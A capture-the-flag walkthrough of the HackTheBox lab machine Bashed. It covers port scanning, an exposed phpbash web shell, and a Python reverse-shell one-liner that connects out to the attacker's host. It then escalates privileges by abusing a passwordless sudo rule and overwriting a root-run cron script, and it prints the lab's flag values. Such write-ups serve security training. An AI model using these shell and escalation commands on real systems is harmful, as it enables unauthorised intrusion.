---
title: HackTheBox - Bashed
date: 2020-12-26 23:59:00 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, phpbash, reverse-shell, sudo weak configuration, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/bashed/Bashed.png
---

## Foothold

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -oN Bashed.txt 10.10.10.68
Warning: 10.10.10.68 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.68
Host is up (0.098s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### Apache/2.4.18 (port 80)

![Arrexel's Development Site](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/bashed/web-1.png)

![only post](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/bashed/web-2.png)

#### `dirb`

![dirb](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/bashed/dirb.png)

#### phpbash

As mentionned on the post we saw earlier &uarr;, [phpbash](https://github.com/Arrexel/phpbash) is running on `/dev`:

![phpbash](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/bashed/phpbash.png)

## reverse shell (`www-data`)

```bash
export RHOST="10.10.14.7";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

![reverse-shell](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/bashed/reverse-shell.png)

```bash
$ ls /home
arrexel  scriptmanager
```

We can read `user.txt` by the way:

```bash
$ cat /home/arrexel/user.txt
2c281f318555dbc1b856957c7147bfc1
```

Okay, so we identified two users:

1. `arrexel` 
2. `scriptmanager`

How about us?

```bash
$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

The sudo config tells us that we can switch to `scriptmanager` without password.

## User #1 (scriptmanager)

```bash
$ sudo -i -u scriptmanager
sudo -i -u scriptmanager
scriptmanager@bashed:~$ find / -user $(whoami) 2>/dev/null | grep -v "^/proc"   
/scripts
/scripts/test.py
/home/scriptmanager
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.nano
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout 
```

Let's inspect this `/scripts` directory:

```
scriptmanager@bashed:~$ cd /scripts
cd /scripts
scriptmanager@bashed:/scripts$ ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Dec 26 13:38 test.txt
scriptmanager@bashed:/scripts$ cat test.txt; echo ""
testing 123!
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

That's suspicious buddy. **root** own the file `test.txt`.

![suspicious gif](https://i.gifer.com/LQW.gif)

Moreover, the file is updated every minute (cronjob?). This implies that `test.py` is executed every minute also. 

More precisely by **root** because the script creates the file `test.txt` and it's owned by him:

![minute](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/bashed/minute.png)

## Root

Let's copy `root.txt` in `/tmp`:

```bash
$ echo "import os; os.system('cp /root/root.txt /tmp/flag'); os.system('chmod 444 /tmp/flag');" > test.py 
```

![flag](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/bashed/flag.png)

```bash
scriptmanager@bashed:/scripts$ cat /tmp/flag
cc4f0afe3a1026d402ba10329674a8e2
```